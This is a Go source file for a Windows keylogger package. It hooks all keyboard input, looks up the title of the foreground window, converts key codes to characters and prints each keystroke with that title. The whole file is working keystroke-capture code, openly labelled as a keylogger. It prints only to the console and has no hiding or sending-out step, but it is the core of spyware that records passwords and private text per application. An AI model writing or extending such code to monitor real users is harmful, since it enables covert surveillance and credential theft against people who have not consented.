// package keylogger... it's a keylogger.
package keylogger

import (
	"fmt"
	"os"
	"os/signal"

	"syscall"
	"unsafe"

	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
)

// var previous_modkey types.VKCode = types.VK_NONAME

var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetKeyState         = mod.NewProc("GetKeyState")
	procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState    = mod.NewProc("GetKeyboardState")
	procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
	procGetWindowText       = mod.NewProc("GetWindowTextW")
	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
)

type (
	HANDLE uintptr
	HWND   HANDLE
)

// Gets length of text of window text by HWND
func GetWindowTextLength(hwnd HWND) int {
	ret, _, _ := procGetWindowTextLength.Call(
		uintptr(hwnd))

	return int(ret)
}

// Gets text of window text by HWND
func GetWindowText(hwnd HWND) string {
	textLen := GetWindowTextLength(hwnd) + 1

	buf := make([]uint16, textLen)
	procGetWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	return syscall.UTF16ToString(buf)
}

// Gets current foreground window
func GetForegroundWindow() uintptr {
	proc := mod.NewProc("GetForegroundWindow")
	hwnd, _, _ := proc.Call()
	return hwnd
}

// Runs the keylogger
func Run() error {
	// Buffer size is depends on your need. The 100 is placeholder value.
	keyboardChan := make(chan types.KeyboardEvent, 100)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("start capturing keyboard input")

	for {
		select {
		case <-signalChan:
			fmt.Println("Received shutdown signal")
			return nil
		case k := <-keyboardChan:
			if hwnd := GetForegroundWindow(); hwnd != 0 {
				text := GetWindowText(HWND(hwnd))
				// fmt.Printf("Received %v %v %v\n", k.Message, k.VKCode, k.ScanCode)
				if k.Message == types.WM_KEYDOWN {
					fmt.Println("window:", text)
					fmt.Println(string(VKCodeToAscii(k)))
				}
			}
		}
	}
}

// Converts from Virtual-Keycode to Ascii rune
func VKCodeToAscii(k types.KeyboardEvent) rune {
	var buffer []uint16 = make([]uint16, 256)
	var keyState []byte = make([]byte, 256)

	n := 10
	n |= (1 << 2)

	procGetKeyState.Call(uintptr(k.VKCode))

	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))
	r1, _, _ := procGetKeyboardLayout.Call(0)

	procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n), r1)

	if len(syscall.UTF16ToString(buffer)) > 0 {
		return []rune(syscall.UTF16ToString(buffer))[0]
	}
	return rune(0)
}
